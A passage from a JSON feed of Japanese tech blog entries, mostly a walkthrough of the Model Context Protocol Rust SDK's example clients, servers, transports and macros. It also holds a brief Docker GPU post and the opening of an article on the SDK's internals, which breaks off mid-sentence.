4のabbrはサブコマンドも展開できるぞ","link":"https://blog.atusy.net/2025/03/29/fish-4-abbr/","contentSnippet":"Fishのabbr使ってますか？aliasの強化版といった感じで、短縮した入力をスペースやエンターと共に本来のコマンドに展開してくれる機能です。","isoDate":"2025-03-29T00:00:00.000Z","dateMiliSeconds":1743206400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Rust製MCPライブラリのサンプルコードから学ぶ活用法","link":"https://syu-m-5151.hatenablog.com/entry/2025/03/28/132800","contentSnippet":"はじめに前回の「Rust製MCPライブラリの内部実装を徹底解析」では、Model Context Protocol (MCP) のRust SDKの内部実装について詳しく解説しました。今回は、その続編として、examples/ディレクトリに含まれるサンプルコードを詳しく見ていきます。github.comMCPを実際のプロジェクトで活用するためには、抽象的な実装だけでなく、具体的な使用例を理解することが重要です。このブログでは、クライアント実装、サーバー実装、マクロの使用例を通じて、MCPの実践的な活用方法を学び、実際に自分で実装できるようになることを目指します。概念が分からない人や自分の他のブログを読みたいくない人はこちらのドキュメントを一読してから読んでほしいです。modelcontextprotocol.ioexamples/の全体構造MCPのRust SDKには豊富なサンプルが含まれています。examples/ディレクトリは以下のような構成になっています。examples/├── clients/        # クライアント実装例├── servers/        # サーバー実装例├── transport/      # トランスポート実装例├── rig-integration/ # Rigフレームワークとの統合例├── wasi/           # WebAssembly実装例└── README.md       # サンプルの概要それぞれのディレクトリには、特定のユースケースに焦点を当てたサンプルコードが含まれています。これらのサンプルは、MCPの様々な機能や統合シナリオを理解するのに役立ちます。クライアント実装例examples/clients/ディレクトリには、MCPクライアントの様々な実装例が含まれています。これらの例を通じて、異なるシナリオでのMCPクライアントの使い方を学びましょう。基本的なクライアント実装: std_io.rs最も基本的なクライアント実装例はstd_io.rsです。このサンプルは標準入出力を使用してMCPサーバーと通信します。use anyhow::Result;use rmcp::{model::CallToolRequestParam, service::ServiceExt, transport::TokioChildProcess};use tokio::process::Command;use tracing_subscriber::layer::SubscriberExt;use tracing_subscriber::util::SubscriberInitExt;#[tokio::main]async fn main() -> Result<()> {    // ロギングの初期化    tracing_subscriber::registry()        .with(            tracing_subscriber::EnvFilter::try_from_default_env()                .unwrap_or_else(|_| format!(\\"info,{}=debug\\", env!(\\"CARGO_CRATE_NAME\\")).into()),        )        .with(tracing_subscriber::fmt::layer())        .init();        // 子プロセスとしてMCPサーバーを起動し、サービスを作成    let service = ()        .serve(TokioChildProcess::new(            Command::new(\\"uvx\\").arg(\\"mcp-server-git\\"),        )?)        .await?;    // サーバー情報の取得    let server_info = service.peer_info();    tracing::info!(\\"Connected to server: {server_info:#?}\\");    // 利用可能なツールの一覧取得    let tools = service.list_tools(Default::default()).await?;    tracing::info!(\\"Available tools: {tools:#?}\\");    // ツールの呼び出し    let tool_result = service        .call_tool(CallToolRequestParam {            name: \\"git_status\\".into(),            arguments: serde_json::json!({ \\"repo_path\\": \\".\\" }).as_object().cloned(),        })        .await?;    tracing::info!(\\"Tool result: {tool_result:#?}\\");        // クライアントの終了    service.cancel().await?;    Ok(())}この例での主要な要素を解説します。#[tokio::main]マクロ: Rustの非同期ランタイムを初期化し、非同期コードを実行できるようにします。TokioChildProcess: 子プロセスとしてMCPサーバーを起動するためのトランスポート実装です。この例では「uvx mcp-server-git」コマンドを実行しています。serveメソッド: トランスポートを使ってサービスを初期化するメソッドです。RustのServiceExtトレイトが提供する拡張機能です。call_toolメソッド: 特定のツールを呼び出すメソッドです。CallToolRequestParam構造体を使ってツール名と引数を指定します。SSEトランスポートの使用: sse.rs次に、Server-Sent Events (SSE) トランスポートを使用する例を見てみましょう。これはWebアプリケーションとMCPを統合する際に特に有用です。use anyhow::Result;use rmcp::model::{ClientCapabilities, ClientInfo, Implementation};use rmcp::{ServiceExt, model::CallToolRequestParam, transport::SseTransport};use tracing_subscriber::layer::SubscriberExt;use tracing_subscriber::util::SubscriberInitExt;#[tokio::main]async fn main() -> Result<()> {    // ロギングの初期化（省略）...    // SSEトランスポートの作成と接続    let transport = SseTransport::start(\\"http://localhost:8000/sse\\").await?;        // クライアント情報の定義    let client_info = ClientInfo {        protocol_version: Default::default(),        capabilities: ClientCapabilities::default(),        client_info: Implementation {            name: \\"test sse client\\".to_string(),            version: \\"0.0.1\\".to_string(),        },    };        // クライアントの作成    let client = client_info.serve(transport).await?;    // サーバー情報の取得    let server_info = client.peer_info();    tracing::info!(\\"Connected to server: {server_info:#?}\\");    // ツール一覧の取得（省略）...    // ツールの呼び出し（省略）...        // クライアントの終了    client.cancel().await?;    Ok(())}このサンプルの特徴的な点は：SseTransport: HTTP経由でMCPサーバーと通信するためのトランスポート実装です。長時間接続を維持し、サーバーからのイベントを受信します。ClientInfo: クライアントに関する情報をサーバーに提供する構造体です。名前やバージョン、プロトコル互換性などの情報が含まれます。複数クライアントの管理: collection.rs複数のMCPクライアントを効率的に管理する例も含まれています。use std::collections::HashMap;use anyhow::Result;use rmcp::service::ServiceExt;use rmcp::{model::CallToolRequestParam, transport::TokioChildProcess};use tokio::process::Command;#[tokio::main]async fn main() -> Result<()> {    // ログ初期化は省略...    // 複数クライアントの作成    let mut client_list = HashMap::new();    for idx in 0..10 {        let service = ()            .into_dyn()            .serve(TokioChildProcess::new(                Command::new(\\"uvx\\").arg(\\"mcp-server-git\\"),            )?)            .await?;        client_list.insert(idx, service);    }    // 各クライアントの使用    for (_, service) in client_list.iter() {        // サーバー情報の取得        let _server_info = service.peer_info();        // ツール一覧の取得        let _tools = service.list_tools(Default::default()).await?;        // ツールの呼び出し        let _tool_result = service            .call_tool(CallToolRequestParam {                name: \\"git_status\\".into(),                arguments: serde_json::json!({ \\"repo_path\\": \\".\\" }).as_object().cloned(),            })            .await?;    }        // クライアントのクリーンアップ    for (_, service) in client_list {        service.cancel().await?;    }    Ok(())}この例では、複数のMCPクライアントを作成し、それぞれに対して操作を実行しています。実際のアプリケーションでは、異なるサーバーに接続する複数のクライアントを管理する場合に役立ちます。サーバー実装例examples/servers/ディレクトリには、様々なMCPサーバー実装例が含まれています。ここでは、基本的なサーバー実装と、Webフレームワークとの統合例を見ていきます。基本的なサーバー実装: std_io.rs最もシンプルなサーバー実装はstd_io.rsです。このサンプルは、標準入出力を使用してクライアントとやり取りする基本的なMCPサーバーを実装しています。use anyhow::Result;use common::counter::Counter;use rmcp::{ServiceExt, transport::stdio};use tracing_subscriber::{self, EnvFilter};mod common;#[tokio::main]async fn main() -> Result<()> {    // ロギングの初期化    tracing_subscriber::fmt()        .with_env_filter(EnvFilter::from_default_env().add_directive(tracing::Level::DEBUG.into()))        .with_writer(std::io::stderr)        .with_ansi(false)        .init();    tracing::info!(\\"Starting MCP server\\");    // Counterサービスを作成し、標準入出力トランスポートで提供    let service = Counter::new().serve(stdio()).await?;    // クライアントからの要求を待機    service.waiting().await?;    Ok(())}このサンプルはシンプルですが、重要な要素がいくつか含まれています。Counter型: これはカウンターサービスを提供するサーバーハンドラの実装です。stdio(): 標準入出力をトランスポートとして使用するための関数です。waiting()メソッド: サーバーがクライアントからの要求を待機するためのメソッドです。次に、Counter型の実装を見てみましょう：use std::sync::Arc;use rmcp::{    Error as McpError, RoleServer, ServerHandler, const_string, model::*, schemars,    service::RequestContext, tool,};use tokio::sync::Mutex;#[derive(Clone)]pub struct Counter {    counter: Arc<Mutex<i32>>,}#[tool(tool_box)]impl Counter {    pub fn new() -> Self {        Self {            counter: Arc::new(Mutex::new(0)),        }    }    #[tool(description = \\"Increment the counter by 1\\")]    async fn increment(&self) -> Result<CallToolResult, McpError> {        let mut counter = self.counter.lock().await;        *counter += 1;        Ok(CallToolResult::success(vec![Content::text(            counter.to_string(),        )]))    }    #[tool(description = \\"Decrement the counter by 1\\")]    async fn decrement(&self) -> Result<CallToolResult, McpError> {        let mut counter = self.counter.lock().await;        *counter -= 1;        Ok(CallToolResult::success(vec![Content::text(            counter.to_string(),        )]))    }    #[tool(description = \\"Get the current counter value\\")]    async fn get_value(&self) -> Result<CallToolResult, McpError> {        let counter = self.counter.lock().await;        Ok(CallToolResult::success(vec![Content::text(            counter.to_string(),        )]))    }}#[tool(tool_box)]impl ServerHandler for Counter {    fn get_info(&self) -> ServerInfo {        ServerInfo {            protocol_version: ProtocolVersion::V_2024_11_05,            capabilities: ServerCapabilities::builder()                .enable_tools()                .build(),            server_info: Implementation::from_build_env(),            instructions: Some(\\"This server provides a counter tool...\\".to_string()),        }    }        // その他の実装は省略...}このCounter実装の重要な点：#[tool(tool_box)]マクロ: これは、メソッドを自動的にMCPツールとして登録するマクロです。これにより、ボイラープレートコードが大幅に削減されます。#[tool(description = \\"...\\")]マクロ: 各メソッドにツールの説明を追加します。この情報はクライアントに公開され、ツールの使用方法を理解するのに役立ちます。Arc<Mutex<i32>>: スレッド間で安全にカウンター値を共有するためのラッパーです。これは、Rustの並行性プリミティブの典型的な使用例です。Axumフレームワークとの統合: axum.rsより高度な例として、Axum WebフレームワークとMCPサーバーを統合した例を見てみましょう。use rmcp::transport::sse_server::SseServer;use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};mod common;use common::counter::Counter;const BIND_ADDRESS: &str = \\"127.0.0.1:8000\\";#[tokio::main]async fn main() -> anyhow::Result<()> {    // ロギングの初期化    tracing_subscriber::registry()        .with(            tracing_subscriber::EnvFilter::try_from_default_env()                .unwrap_or_else(|_| \\"debug\\".to_string().into()),        )        .with(tracing_subscriber::fmt::layer())        .init();    // SSEサーバーの起動とカウンターサービスの設定    let ct = SseServer::serve(BIND_ADDRESS.parse()?)        .await?        .with_service(Counter::new);    // Ctrl+Cで終了するまで待機    tokio::signal::ctrl_c().await?;    ct.cancel();    Ok(())}このサンプルの特徴的な点：SseServer::serve: AxumフレームワークをベースにしたSSEサーバーを起動する関数です。これにより、ブラウザからMCPサーバーにアクセスできるようになります。with_service: サービスファクトリを指定するメソッドです。この例ではCounter::new関数をファクトリとして使用しています。tokio::signal::ctrl_c().await?: Ctrl+Cシグナルを受け取るまで待機します。これにより、サーバーはバックグラウンドで動作し続けます。Webフレームワーク統合のポイントWebフレームワーク（Axum、Actix Webなど）とMCPを統合する際のポイント：適切なトランスポート（SSEなど）を選択するセッション管理を適切に行うエラーハンドリングを丁寧に実装するサーバーのライフサイクルを適切に管理するマクロ使用例examples/macros/ディレクトリには、MCPマクロを使用してツールを簡単に定義する例が含まれています。これらのマクロは、ボイラープレートコードを大幅に削減し、MCPサーバーの実装を容易にします。計算機ツールの実装calculator.rsは、#[tool]マクロを使用して計算機ツールを実装する例です。use mcp_core::handler::{ToolError, ToolHandler};use mcp_macros::tool;#[tool(    name = \\"calculator\\",    description = \\"Perform basic arithmetic operations\\",    params(        x = \\"First number in the calculation\\",        y = \\"Second number in the calculation\\",        operation = \\"The operation to perform (add, subtract, multiply, divide)\\"    ))]async fn calculator(x: i32, y: i32, operation: String) -> Result<i32, ToolError> {    match operation.as_str() {        \\"add\\" => Ok(x + y),        \\"subtract\\" => Ok(x - y),        \\"multiply\\" => Ok(x * y),        \\"divide\\" => {            if y == 0 {                Err(ToolError::ExecutionError(\\"Division by zero\\".into()))            } else {                Ok(x / y)            }        }        _ => Err(ToolError::InvalidParameters(format!(            \\"Unknown operation: {}\\",            operation        ))),    }}#[tokio::main]async fn main() -> std::result::Result<(), Box<dyn std::error::Error>> {    // ツールのインスタンスを作成    let calculator = Calculator;    // ツール情報の出力    println!(\\"Tool name: {}\\", calculator.name());    println!(\\"Tool description: {}\\", calculator.description());    println!(\\"Tool schema: {}\\", calculator.schema());    // サンプル入力でツールをテスト    let input = serde_json::json!({        \\"x\\": 5,        \\"y\\": 3,        \\"operation\\": \\"multiply\\"    });    let result = calculator.call(input).await?;    println!(\\"Result: {}\\", result);    Ok(())}このサンプルの素晴らしい点：宣言的なツール定義: #[tool]マクロを使うことで、通常の関数にメタデータを追加するだけでMCPツールを定義できます。パラメータドキュメント: params(x = \\"First number...\\")のように、パラメータの説明をマクロ内で定義できます。これにより、自己文書化されたAPIが作成されます。型安全: 関数の引数型（i32, Stringなど）を利用して型安全なパラメータを定義します。Rustのコンパイラが型チェックを行うため、型関連のバグを防ぐことができます。マクロの活用術マクロを効果的に使用するためのポイント：適切な名前と説明を提供して、ツールの目的を明確にするパラメータに詳細な説明を追加して、ユーザーが正しい値を入力できるようにする複雑なパラメータには構造体を使用し、#[tool(aggr)]アノテーションで集約するエラーハンドリングを丁寧に行い、具体的なエラーメッセージを提供するトランスポート実装例examples/transport/ディレクトリには、様々なトランスポート実装例が含まれています。トランスポートは、MCPクライアントとサーバーの通信方法を定義します。TCPトランスポートtcp.rsは、TCP接続を使用してMCPメッセージを送受信する例です。use common::calculator::Calculator;use rmcp::{serve_client, serve_server};mod common;#[tokio::main]async fn main() -> anyhow::Result<()> {    tokio::spawn(server());    client().await?;    Ok(())}async fn server() -> anyhow::Result<()> {    let tcp_listener = tokio::net::TcpListener::bind(\\"127.0.0.1:8001\\").await?;    while let Ok((stream, _)) = tcp_listener.accept().await {        tokio::spawn(async move {            let server = serve_server(Calculator, stream).await?;            server.waiting().await?;            anyhow::Ok(())        });    }    Ok(())}async fn client() -> anyhow::Result<()> {    let stream = tokio::net::TcpSocket::new_v4()?        .connect(\\"127.0.0.1:8001\\".parse()?)        .await?;    let client = serve_client((), stream).await?;    let tools = client.peer().list_tools(Default::default()).await?;    println!(\\"{:?}\\", tools);    Ok(())}このサンプルでは：非同期I/O: tokioの非同期I/O機能を使用して、ブロッキングせずに複数の接続を処理します。serve_serverとserve_client: これらは便利なヘルパー関数で、トランスポートをサーバーまたはクライアントとして設定します。並行接続処理: tokio::spawnを使って各接続を別々のタスクで処理し、サーバーのスケーラビリティを確保しています。WebSocketトランスポートwebsocket.rsは、WebSocket接続を使用したMCPトランスポートの例です。async fn http_client(uri: &str) -> anyhow::Result<RunningService<RoleClient, ()>> {    let (stream, response) = tokio_tungstenite::connect_async(uri).await?;    if response.status() != tungstenite::http::StatusCode::SWITCHING_PROTOCOLS {        return Err(anyhow::anyhow!(\\"failed to upgrade connection\\"));    }    let transport = WebsocketTransport::new_client(stream);    let client = ().serve(transport).await?;    Ok(client)}async fn start_server() -> anyhow::Result<()> {    let tcp_listener = tokio::net::TcpListener::bind(\\"127.0.0.1:8001\\").await?;    tokio::spawn(async move {        while let Ok((stream, addr)) = tcp_listener.accept().await {            tracing::info!(\\"accepted connection from: {}\\", addr);            tokio::spawn(async move {                let ws_stream = tokio_tungstenite::accept_async(stream).await?;                let transport = WebsocketTransport::new_server(ws_stream);                let server = Calculator.serve(transport).await?;                server.waiting().await?;                Ok::<(), anyhow::Error>(())            });        }    });    Ok(())}このサンプルでは：WebSocketプロトコル: HTTPからWebSocketにアップグレードする処理が含まれています。カスタムトランスポート実装: WebsocketTransportとしてカスタムトランスポートが実装されています。接続管理: 接続の確立からサーバー待機までの一連のフローが示されています。トランスポート選択のポイント適切なトランスポートを選択するためのポイント：用途に合わせて選択する:標準入出力（stdio）: コマンドラインツールや子プロセスSSE: Webブラウザとのリアルタイム通信TCP: ネットワーク上のサービス間通信WebSocket: 双方向リアルタイム通信Unix Socket: 同一マシン上のプロセス間通信セキュリティを考慮する: 公開ネットワークで使用する場合はTLSなどの暗号化を検討パフォーマンスを考慮する: 大量のデータや頻繁な通信がある場合は効率的なトランスポートを選択応用パターンとベストプラクティスMCPを実装する際の応用パターンとベストプラクティスをいくつか紹介します。エラーハンドリング具体的なエラーメッセージ: クライアントが問題を理解できるよう、具体的なエラーメッセージを提供します。   Err(ToolError::InvalidParameters(format!(       \\"Unknown operation: {}. Supported operations are: add, subtract, multiply, divide\\",       operation   )))エラー変換: 低レベルエラーを適切なMCPエラーに変換します。   async fn read_file(&self, path: String) -> Result<CallToolResult, McpError> {       let content = tokio::fs::read_to_string(path)           .await           .map_err(|e| McpError::tool_execution_error(               \\"file_read_error\\",               Some(serde_json::json!({ \\"error\\": e.to_string() }))           ))?;              Ok(CallToolResult::success(vec![Content::text(content)]))   }非同期処理適切なタスク管理: 長時間実行される処理は別タスクに分離し、クライアントをブロックしないようにします。   #[tool(description = \\"Run a long process\\")]   async fn run_long_process(&self) -> Result<CallToolResult, McpError> {       // 別タスクでバックグラウンド処理を開始       let task_id = self.start_background_task().await?;              // タスクIDを即座に返す       Ok(CallToolResult::success(vec![Content::text(format!(           \\"Task started with ID: {}\\", task_id       ))]))   }      // 別のツールでタスク状態を確認できるようにする   #[tool(description = \\"Check task status\\")]   async fn check_task_status(&self, #[tool(param)] task_id: String) -> Result<CallToolResult, McpError> {       // ...   }タイムアウト管理: 長時間の操作にはタイムアウトを設定します。   let result = tokio::time::timeout(       Duration::from_secs(30),       some_long_operation()   ).await.map_err(|_| McpError::tool_execution_error(       \\"operation_timeout\\",       Some(serde_json::json!({\\"message\\": \\"Operation timed out after 30 seconds\\"}))   ))??;リソース管理共有状態の適切な管理: Arc<Mutex<T>>やArc<RwLock<T>>を使用して、スレッド間で状態を安全に共有します。リソースのクリーンアップ: Dropトレイトを実装して、リソースが確実に解放されるようにします。コネクション管理: クライアント接続を適切に管理し、リソースリークを防ぎます。実際の使用例：LLMとの統合MCPはLLM（大規模言語モデル）に外部ツールへのアクセスを提供するために設計されています。ここでは、LLMとMCPの統合例を見てみましょう。examples/rig-integration/ディレクトリには、Rigフレームワーク（LLMアプリケーションフレームワーク）とMCPの統合例が含まれています。// MCPツールをRigのツールとして適応させるアダプタpub struct McpToolAdaptor {    tool: McpTool,    server: ServerSink,}impl RigTool for McpToolAdaptor {    fn name(&self) -> String {        self.tool.name.to_string()    }    fn definition(        &self,        _prompt: String,    ) -> std::pin::Pin<Box<dyn Future<Output = rig::completion::ToolDefinition> + Send + Sync + \'_>>    {        Box::pin(std::future::ready(rig::completion::ToolDefinition {            name: self.name(),            description: self.tool.description.to_string(),            parameters: self.tool.schema_as_json_value(),        }))    }    fn call(        &self,        args: String,    ) -> std::pin::Pin<        Box<dyn Future<Output = Result<String, rig::tool::ToolError>> + Send + Sync + \'_>,    > {        let server = self.server.clone();        Box::pin(async move {            let call_mcp_tool_result = server                .call_tool(CallToolRequestParam {                    name: self.tool.name.clone(),                    arguments: serde_json::from_str(&args)                        .map_err(rig::tool::ToolError::JsonError)?,                })                .await                .map_err(|e| rig::tool::ToolError::ToolCallError(Box::new(e)))?;            Ok(convert_mcp_call_tool_result_to_string(call_mcp_tool_result))        })    }}このアダプタは、MCPツールをRigフレームワークのツールとして使用できるようにします。これにより、LLMとMCPサーバーをシームレスに統合することができます。WASI (WebAssembly System Interface) 対応examples/wasi/ディレクトリには、WebAssemblyでMCPサーバーを実装する例が含まれています。これにより、ブラウザやエッジコンピューティング環境でMCPサーバーを実行できます。// wasi/src/lib.rsstruct TokioCliRunner;impl wasi::exports::cli::run::Guest for TokioCliRunner {    fn run() -> Result<(), ()> {        let rt = tokio::runtime::Builder::new_current_thread()            .enable_all()            .build()            .unwrap();        rt.block_on(async move {            tracing_subscriber::fmt()                .with_env_filter(                    EnvFilter::from_default_env().add_directive(tracing::Level::DEBUG.into()),                )                .with_writer(std::io::stderr)                .with_ansi(false)                .init();            let server = calculator::Calculator.serve(wasi_io()).await.unwrap();            server.waiting().await.unwrap();        });        Ok(())    }}wasi::cli::command::export!(TokioCliRunner);WASI環境でMCPサーバーを実行することで、セキュリティやポータビリティが向上し、より多くの環境でMCPを活用できるようになります。まとめMCPのRust SDKには、様々なユースケースに対応するための豊富なサンプルコードが含まれています。これらのサンプルを理解し、実際に試すことで、MCPを活用したアプリケーションの開発スキルを向上させることができます。この記事でカバーした主なポイント：クライアント実装: 基本的なクライアント、SSEトランスポートの使用、複数クライアントの管理サーバー実装: 基本的なサーバー、ツールボックスとマクロの活用、Webフレームワークとの統合トランスポート実装: TCP、WebSocket、Unix Socketなどの様々なトランスポート応用パターン: エラーハンドリング、非同期処理、リソース管理のベストプラクティスLLM統合: Rigフレームワークを使ったLLMとMCPの統合例MCPはまだ比較的新しいプロトコルですが、AIとツールの統合に関する標準化に大きな可能性を秘めています。Rustの強力な型システムと安全性の恩恵を受けながら、MCPの機能を最大限に活用しましょう。生成AIについて興味があればこちらも読んでみてもらいたいです。NEXUS 情報の人類史 上　人間のネットワーク作者:ユヴァル・ノア・ハラリ河出書房新社AmazonNEXUS 情報の人類史 下　AI革命作者:ユヴァル・ノア・ハラリ河出書房新社Amazon","isoDate":"2025-03-28T04:28:00.000Z","dateMiliSeconds":1743136080000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"nvidia/cuda imageを使ってDockerコンテナでGPUを使用する","link":"https://sreake.com/blog/gpu-used-docker-with-nvidia-cuda-image/","contentSnippet":"はじめに Sreake事業部アプリケーション開発チームの角谷です！ 最近、機械学習やディープラーニング、特に生成AIの分野で、GPUの活用がますます重要になってきています。 Stable DiffusionやChatGP […]The post nvidia/cuda imageを使ってDockerコンテナでGPUを使用する first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-27T04:33:27.000Z","dateMiliSeconds":1743050007000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Rust製MCPライブラリの内部実装を徹底解析","link":"https://syu-m-5151.hatenablog.com/entry/2025/03/27/121602","contentSnippet":"はじめに最近注目を集めているModel Context Protocol（MCP）は、大規模言語モデル（LLM）に外部ツールやサービスへのアクセス能力を提供するための標準プロトコルです。中でも公式が提供しているRust SDKはあまり注目されていませんが、私自身が必要としているためこのドキュメントを作成します。github.com以前は自前で実装していましたが、公式SDKが公開されたことでそちらを検討するのが良いと考えました。私の実装と比較してかなり洗練されている点が多く、多くの学びを得ることができました。syu-m-5151.hatenablog.comこの記事では、MCP Rust SDKの内部実装を深掘りし、どのようにRustの強力な型システムと非同期プログラミングモデルが活用されているかを解説します。コードの詳細な分析を通して、Rustの優れた設計パターンや実装テクニックを学びましょう。このブログが良ければ読者になったり、nwiizoをフォロワーしてくれるのもありがたいです。MCP とは何か？記事を始める前に、まず MCP (Model Context Protocol) について簡単に説明しましょう。MCP についてより詳しい情報は、公式ドキュメント modelcontextprotocol.io や Anthropic の Model Context Protocol に関する記事 を参照してください。MCP は Cline や Cursor などの LLM クライアントが外部サービスと連携するためのプロトコルです。従来の LLM は学習したデータに基づいて「考える」ことしかできませんでしたが、MCP を通じて外部と連携し、「行動する」能力を持つことができます。具体的には、MCP を使うことで以下のようなことが可能になります。Notion のファイル編集Supabase のデータベースクエリCloudflare のステータスチェックローカルファイルの編集や操作mcpserver.ccMCP がプロトコルとして統一されていることで、LLM プロバイダーやサービスを柔軟に切り替えることができるという大きなメリットがあります。modelcontextprotocol.ioMCP の仕組みMCP は基本的に JSON-RPC ベースのプロトコルで、詳細な仕様は modelcontextprotocol.io/docs/concepts/transports#message-format で確認できます。主要な構成要素は以下のとおりです。リソース（Resources）：データへのアクセスを提供（REST API の GET に相当）ツール（Tools）：アクションの実行を可能にする（REST API の POST に相当）プロンプト（Prompts）：LLM がどのようにサービスを使うべきかのガイダンスMCP の実装をサポートするための公式 SDK が複数の言語で提供されています(2024年3月27日 現在)。ちなみに今後MCPがどうなってゆくかはRoadmapが存在しているのでぜひ、こちらを読んでもらいたいです。modelcontextprotocol.ioSDKの全体構成 - 明確な関心の分離MCP Rust SDKは、複数のクレートに明確に分離されており、それぞれが特定の責任を担っています。rust-sdk/├── crates/│   ├── mcp-core/      # プロトコルの基本型とインターフェース│   ├── mcp-client/    # クライアント実装│   ├── mcp-server/    # サーバー実装│   └── mcp-macros/    # ツール実装を簡素化するマクロ└── examples/    ├── clients/       # クライアント使用例    ├── servers/       # サーバー実装例    └── macros/        # マクロ使用例この設計はRustエコシステムでよく見られる「関心の分離」パターンに従っています。各クレートがひとつの責任を持ち、依存関係も明確です。こうすることで、メンテナンス性と再利用性が大幅に向上します。特に注目すべきは、コア型定義とプロトコル実装をmcp-coreに分離している点です。これにより、クライアントとサーバーが共通の型定義を使いながら、それぞれ独立して実装・進化できる柔軟性を確保しています。mcp-core: 堅牢な基盤となる型定義mcp-coreクレートは、MCPプロトコルの心臓部とも言える基本型とインターフェースを提供しています。ここでの実装がSDK全体の品質を大きく左右します。JSON-RPCメッセージの巧妙な実装MCPはJSON-RPCプロトコルをベースにしていますが、その実装が非常に興味深いものになっています#[derive(Debug, Serialize, Deserialize, Clone, PartialEq)]#[serde(untagged, try_from = \\"JsonRpcRaw\\")]pub enum JsonRpcMessage {    Request(JsonRpcRequest),    Response(JsonRpcResponse),    Notification(JsonRpcNotification),    Error(JsonRpcError),    Nil, // used to respond to notifications}#[derive(Debug, Serialize, Deserialize)]struct JsonRpcRaw {    jsonrpc: String,    #[serde(skip_serializing_if = \\"Option::is_none\\")]    id: Option<u64>,    #[serde(skip_serializing_if = \\"Option::is_none\\")]    method: Option<String>,    #[serde(skip_serializing_if = \\"Option::is_none\\")]    params: Option<Value>,    #[serde(skip_serializing_if = \\"Option::is_none\\")]    result: Option<Value>,    #[serde(skip_serializing_if = \\"Option::is_none\\")]    error: Option<ErrorData>,}impl TryFrom<JsonRpcRaw> for JsonRpcMessage {    type Error = String;    fn try_from(raw: JsonRpcRaw) -> Result<Self, <Self as TryFrom<JsonRpcRaw>>::Error> {        // If it has an error field, it\'s an error response        if raw.error.is_some() {            return Ok(JsonRpcMessage::Error(JsonRpcError {                jsonrpc: raw.jsonrpc,                id: raw.id,                error: raw.error.unwrap(),            }));        }        // If it has a result field, it\'s a response        if raw.result.is_some() {            return Ok(JsonRpcMessage::Response(JsonRpcResponse {                jsonrpc: raw.jsonrpc,                id: raw.id,                result: raw.result,                error: None,            }));        }        // If we have a method, it\'s either a notification or request        if let Some(method) = raw.method {            if raw.id.is_none() {                return Ok(JsonRpcMessage::Notification(JsonRpcNotification {                    jsonrpc: raw.jsonrpc,                    method,                    params: raw.params,                }));            }            return Ok(JsonRpcMessage::Request(JsonRpcRequest {                jsonrpc: raw.jsonrpc,                id: raw.id,                method,                params: raw.params,            }));        }        // If we have no method and no result/error, it\'s a nil response        if raw.id.is_none() && raw.result.is_none() && raw.error.is_none() {            return Ok(JsonRpcMessage::Nil);        }        // If we get here, something is wrong with the message        Err(format!(            \\"Invalid JSON-RPC message format: id={:?}, method={:?}, result={:?}, error={:?}\\",            raw.id, raw.method, raw.result, raw.error        ))    }}この実装の素晴らしい点は3つあります。#[serde(untagged)]アノテーションの活用：JSONデータの構造に基づいて適切な列挙型バリアントに自動的にデシリアライズします。これにより、外部向けのJSONはシンプルな形式を維持できます。try_from = \\"JsonRpcRaw\\"による変換の分離：複雑な変換ロジックを別の型に委譲し、コードの見通しを良くしています。これはRustの型システムを活用した優れたパターンです。段階的な判断ロジック：各メッセージタイプの判定条件を明確にし、順番に評価することで複雑な条件分岐を読みやすく実装しています。これらの工夫により、複雑なJSON-RPCプロトコルの処理を堅牢かつ読みやすいコードで実現しています。特に注目すべきは、Rustの型システムを最大限に活用し、コンパイル時の型チェックでバグを防ぐ設計になっている点です。豊かなコンテンツ型システムMCPはさまざまなコンテンツ型（テキスト、画像、リソースなど）をサポートしています。その実装も非常に洗練されています。#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]#[serde(tag = \\"type\\", rename_all = \\"camelCase\\")]pub enum Content {    Text(TextContent),    Image(ImageContent),    Resource(EmbeddedResource),}impl Content {    pub fn text<S: Into<String>>(text: S) -> Self {        Content::Text(TextContent {            text: text.into(),            annotations: None,        })    }    pub fn image<S: Into<String>, T: Into<String>>(data: S, mime_type: T) -> Self {        Content::Image(ImageContent {            data: data.into(),            mime_type: mime_type.into(),            annotations: None,        })    }    pub fn resource(resource: ResourceContents) -> Self {        Content::Resource(EmbeddedResource {            resource,            annotations: None,        })    }    // その他のメソッド...}この実装には、使いやすさと型安全性を両立する工夫がいくつもあります。タグ付き列挙型の活用：#[serde(tag = \\"type\\")]は、JSONに「type」フィールドを追加し、その値に基づいて適切な型にデシリアライズします。これはJSONとRustの型を自然にマッピングする優れた方法です。ファクトリメソッド：text(), image(), resource()などのメソッドは、わかりやすい方法でコンテンツを作成できるようにしています。これは、制約を守りながら簡潔にオブジェクトを作成するのに役立ちます。ジェネリックな引数：S: Into<String>のようなトレイト境界を使うことで、文字列リテラル、String、&strなど、さまざまな文字列型を引数として受け入れることができます。これは使い勝手を大幅に向上させます。この設計は、使いやすいAPIと堅牢な内部実装のバランスが見事です。とりわけ、列挙型とそのバリアントを活用してドメインの概念を表現する点はRustらしいアプローチと言えるでしょう。mcp-client: 柔軟なトランスポートと抽象化mcp-clientクレートは、MCPサーバーとの通信を担当します。特に注目すべきは、トランスポート層の抽象化です。トランスポートの抽象化MCPサーバーとの通信には複数の方法（標準入出力、HTTP、WebSocketなど）が考えられます。このSDKはそれらを抽象化するための優れた設計を採用しています。/// A message that can be sent through the transport#[derive(Debug)]pub struct TransportMessage {    /// The JSON-RPC message to send    pub message: JsonRpcMessage,    /// Channel to receive the response on (None for notifications)    pub response_tx: Option<oneshot::Sender<Result<JsonRpcMessage, Error>>>,}/// A generic asynchronous transport trait with channel-based communication#[async_trait]pub trait Transport {    type Handle: TransportHandle;    /// Start the transport and establish the underlying connection.    /// Returns the transport handle for sending messages.    async fn start(&self) -> Result<Self::Handle, Error>;    /// Close the transport and free any resources.    async fn close(&self) -> Result<(), Error>;}#[async_trait]pub trait TransportHandle: Send + Sync + Clone + \'static {    async fn send(&self, message: JsonRpcMessage) -> Result<JsonRpcMessage, Error>;}この抽象化にはいくつもの巧妙な工夫があります。関連型（associated type）の活用：type Handle: 